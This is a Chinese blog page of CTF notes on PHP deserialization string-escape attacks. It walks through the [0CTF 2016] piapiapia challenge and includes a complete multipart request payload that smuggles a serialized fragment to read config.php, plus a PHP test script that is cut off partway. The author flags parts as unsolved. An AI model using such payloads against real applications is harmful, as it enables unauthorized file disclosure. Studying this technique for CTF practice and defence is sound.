@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="自从去年接触newstar的那道pop链后就没有再接触php反序列化了，刚好遇到qwb24的platform那就来复习一下  UNSOVLED extract() 序列化后各个属性的排列顺序 总结以下 字符串增加构造那一步还没有解决  字符串逃逸 目的: php反序列化的字符串绕过最终目的是要实现对不可设置变量的控制(无法直接控制序列化字符串)，或者说构造成功后可以在从故意的被替换变量后实现对序">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php反序列化字符逃逸">
+<meta property="og:url" content="https://kc1zs4.github.io/2024/11/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/index.html">
+<meta property="og:site_name" content="KC1zs4&#39;s Blog">
+<meta property="og:description" content="自从去年接触newstar的那道pop链后就没有再接触php反序列化了，刚好遇到qwb24的platform那就来复习一下  UNSOVLED extract() 序列化后各个属性的排列顺序 总结以下 字符串增加构造那一步还没有解决  字符串逃逸 目的: php反序列化的字符串绕过最终目的是要实现对不可设置变量的控制(无法直接控制序列化字符串)，或者说构造成功后可以在从故意的被替换变量后实现对序">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-11-06T03:30:14.595Z">
+<meta property="article:modified_time" content="2024-11-08T13:35:34.723Z">
+<meta property="article:tag" content="php">
+<meta property="article:tag" content="all in one">
+<meta property="article:tag" content="php serialize">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>php反序列化字符逃逸</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/11/07/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/11/06/ProxyRevenge_%E5%BC%BA%E7%BD%9124/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2024/11/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2024/11/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/&text=php反序列化字符逃逸"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2024/11/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/&title=php反序列化字符逃逸"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2024/11/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/&is_video=false&description=php反序列化字符逃逸"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=php反序列化字符逃逸&body=Check out this article: https://kc1zs4.github.io/2024/11/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2024/11/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/&title=php反序列化字符逃逸"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2024/11/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/&title=php反序列化字符逃逸"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2024/11/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/&title=php反序列化字符逃逸"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2024/11/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/&title=php反序列化字符逃逸"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2024/11/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/&name=php反序列化字符逃逸&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2024/11/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/&t=php反序列化字符逃逸"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#UNSOVLED"><span class="toc-number">1.</span> <span class="toc-text">UNSOVLED</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="toc-number">2.</span> <span class="toc-text">字符串逃逸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A2%9E%E5%8A%A0"><span class="toc-number">3.</span> <span class="toc-text">字符串增加</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%A2%B3%E7%90%86"><span class="toc-number">3.1.</span> <span class="toc-text">+基础梳理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0CTF-2016-piapiapia"><span class="toc-number">3.2.</span> <span class="toc-text">[0CTF 2016]piapiapia</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B1%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E8%BF%87%E7%A8%8B"><span class="toc-number">3.2.1.</span> <span class="toc-text">+例1的思考与过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B1%E7%9A%84php%E6%B5%8B%E8%AF%95%E8%84%9A%E6%9C%AC"><span class="toc-number">3.2.2.</span> <span class="toc-text">+例1的php测试脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B1fixed"><span class="toc-number">3.2.3.</span> <span class="toc-text">+例1fixed</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%8F%E5%B0%91"><span class="toc-number">4.</span> <span class="toc-text">字符串减少</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%A2%B3%E7%90%86-1"><span class="toc-number">4.1.</span> <span class="toc-text">-基础梳理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php"><span class="toc-number">4.2.</span> <span class="toc-text">[安洵杯 2019]easy_serialize_php</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B1%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E8%BF%87%E7%A8%8B-1"><span class="toc-number">4.2.1.</span> <span class="toc-text">-例1的思考与过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B1%E6%80%BB%E7%BB%93"><span class="toc-number">4.2.2.</span> <span class="toc-text">*-例1总结</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B1%E6%BA%90%E7%A0%81"><span class="toc-number">4.2.3.</span> <span class="toc-text">-例1源码</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        php反序列化字符逃逸
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name"></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-06T03:30:14.595Z" class="dt-published" itemprop="datePublished">2024-11-06</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/all-in-one/" rel="tag">all in one</a>, <a class="p-category" href="/tags/php/" rel="tag">php</a>, <a class="p-category" href="/tags/php-serialize/" rel="tag">php serialize</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <blockquote>
+<p>自从去年接触newstar的那道pop链后就没有再接触php反序列化了，刚好遇到qwb24的platform那就来复习一下</p>
+</blockquote>
+<h2 id="UNSOVLED"><a href="#UNSOVLED" class="headerlink" title="UNSOVLED"></a>UNSOVLED</h2><ol>
+<li>extract()</li>
+<li>序列化后各个属性的排列顺序</li>
+<li>总结以下</li>
+<li>字符串增加构造那一步还没有解决</li>
+</ol>
+<h2 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h2><ol>
+<li><em><strong>目的</strong></em>: php反序列化的字符串绕过最终目的是要实现对不可设置变量的控制(无法直接控制序列化字符串)，或者说构造成功后可以在从<strong>故意的被替换变量后实现对序列化字符串的完全控制</strong>，以两道例题为例<ol>
+<li>[安洵杯 2019]easy_serialize_php中通过user的被替换来通过function构造特殊值实现user变量后对序列化字符串的完全掌控</li>
+</ol>
+</li>
+<li><em><strong>注意点与前提</strong></em><ol>
+<li>字符串减少类型中，一般需要两个变量来实现，一个进行过滤构造如user(需要不会被用的，因为构造后一般血肉模糊了)，如例题中的function</li>
+<li>注意反序列化覆盖的情况会<strong>根据需构造控制的变量的位置不同</strong>，具体进行观察</li>
+</ol>
+</li>
+<li><em><strong>一些技巧</strong></em><ol>
+<li>python len()获取长度很快</li>
+<li>反序列化以长度为值标识，并不是以引号的，但是<strong>会在每一个值加上双引号</strong>，在构造时要注意是要算上引号的</li>
+</ol>
+</li>
+<li><em><strong>出现原因与底层原因</strong></em><ol>
+<li>反序列化的过程中必须严格按照序列化规则才能成功实现反序列化：<strong>长度</strong>和<strong>数量</strong></li>
+<li>php字符串序列化是以<code>;&#125;</code>结尾的，对象序列化是直接<code>&#125;</code>结尾，并通过长度与<code>&#125;</code>来判断范围而不是引号<code>&#39;&quot;</code>的闭合 -&gt; <code>a:2:&#123;i:0;s:4:&quot;flag&quot;;i:1;s:6:&#39;mikasa&#39;;&#125;abc</code>长度到达且<code>&#125;</code>闭合外部的字符不对反序列化产生影响</li>
+</ol>
+</li>
+</ol>
+<h2 id="字符串增加"><a href="#字符串增加" class="headerlink" title="字符串增加"></a>字符串增加</h2><h3 id="基础梳理"><a href="#基础梳理" class="headerlink" title="+基础梳理"></a>+基础梳理</h3><ol>
+<li><strong>构造长度</strong>: 由于长度不变但是实际内容替换边长会包含过少内容，利用长度尾部<code>&#125;</code>闭合的特性，通过 –&gt; 尾部<code>&#125;</code>截断多余部分</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;xxx&quot;</span>xx<span class="string">&quot;&#125;</span></span><br><span class="line"><span class="string">&#123;s:4:&quot;</span>user<span class="string">&quot;;s:6:&quot;</span>yyyyyy<span class="string">&quot;yyyy&quot;</span>&#125;</span><br><span class="line">a:<span class="number">4</span>:&#123;whatever;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>&#125;    <span class="comment">// 注意这里a需要4个元素，并且使用了数组绕过</span></span><br><span class="line"><span class="comment">// 只需要n2=n1-1即可构造，对于*2字符来说的情况下</span></span><br><span class="line"><span class="comment">// 对于5-&gt;6 符也符合上市，n1表示个数，n2表示字符数</span></span><br><span class="line">&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;where&quot;</span><span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">&#123;s:4:&quot;</span>user<span class="string">&quot;;s:6:&quot;</span>hacker<span class="string">&quot;&quot;</span>;&#125;  <span class="comment">// 多出来一个&quot;成功逃逸</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// origin2</span></span><br><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;1@1.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;</span>;&#125;</span><br><span class="line"><span class="comment">// target2</span></span><br><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;1@1.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造</span></span><br><span class="line"></span><br><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">1</span>:<span class="string">&quot;where&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;1@1.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">1</span>:<span class="string">&quot;where&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;1@1.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;</span><br><span class="line">    <span class="comment">// ;&#125;s:5:&quot;email&quot;;s:7:&quot;1@1.com&quot;;s:8:&quot;nickname&quot;;s:5:&quot;hello&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php 这些就是n2的长度了 --&gt; 83</span></span><br><span class="line">    <span class="comment">// n2 = n1 - 1，所以需要 84 个where</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h3><h4 id="例1的思考与过程"><a href="#例1的思考与过程" class="headerlink" title="+例1的思考与过程"></a>+例1的思考与过程</h4><ol>
+<li><p>index.php进入，登录有profile.php</p>
+<ol>
+<li>profile.php中存在反序列化，并且有读取文件操作，可以作为可以攻击点</li>
+<li>这里的update.php这里使用的有一些限制，感觉photo这里可能可以进行注入，注意这里是最后一个属性了 -&gt; 或许可以传入伪协议？</li>
+<li>后端使用mysql，md5格式存储密码，可能存在单引号注入(看看filter)</li>
+</ol>
+</li>
+<li><p>这道题的重点不在于管理员，而在于photo的序列化？</p>
+</li>
+<li><p>上传后的文件可以直接访问，直接下载，但是这里不是包含；在profile面的也不行，是img引用，那利用点在哪里呢</p>
+<ol>
+<li>发现对文件内容的过滤几乎没有，phar反序列化？</li>
+</ol>
+</li>
+<li><p>哦对，刚才对profile对象有进行序列化和反序列化，看看</p>
+<ol>
+<li>update.php最后将会序列化内容后加载如mysql中，注意到种类的photo字段总是被作为<code>upload/md5(xxx)</code>，所以也没法用我们的伪协议phar，需要进行绕过 -&gt; <strong>自定义序列化字符串内容</strong>，通过字符串截断进行解决，最终指向phar伪协议反弹shell？</li>
+</ol>
+</li>
+<li><p>fix</p>
+<blockquote>
+<p>wc了看漏了，flag就在config.php中，你看，又急，使得photo指向config.php即可 –&gt; config.php无法直接读，是php文件<br>这里还要确定是否可以通过构造实现，发现是在序列化后再过滤的，符合</p>
+</blockquote>
+</li>
+<li><p>思路有了，开始构造吧</p>
+</li>
+<li><p>最终payload1</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary829AijVZyBKQPaGz</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;phone&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="number">12345678910</span></span><br><span class="line">------WebKitFormBoundary829AijVZyBKQPaGz</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;email&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>@<span class="number">1.</span>com</span><br><span class="line">------WebKitFormBoundary829AijVZyBKQPaGz</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;nickname[]&quot;</span></span><br><span class="line"></span><br><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">------WebKitFormBoundary829AijVZyBKQPaGz</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;</span>photo<span class="string">&quot;; filename=&quot;</span>muma.php<span class="string">&quot;</span></span><br><span class="line"><span class="string">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">what can i sya</span></span><br><span class="line"><span class="string">------WebKitFormBoundary829AijVZyBKQPaGz--</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="例1的php测试脚本"><a href="#例1的php测试脚本" class="headerlink" title="+例1的php测试脚本"></a>+例1的php测试脚本</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>]));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="literal">NULL</span>&gt;<span class="number">10</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>]) &gt; <span class="number">10</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;strlen(array) is too long&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;*************************&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>]))&#123;    <span class="comment">// 邮箱需要@和.并且在1-10位之间</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&#x27;</span>. <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] .<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>,<span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>]) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)&#123;    <span class="comment">// 任何不是数字字母或者长度超过10不行</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&#x27;</span>. <span class="variable">$profile</span>[<span class="string">&#x27;&#x27;</span>] .<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$sStr</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$sStr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span 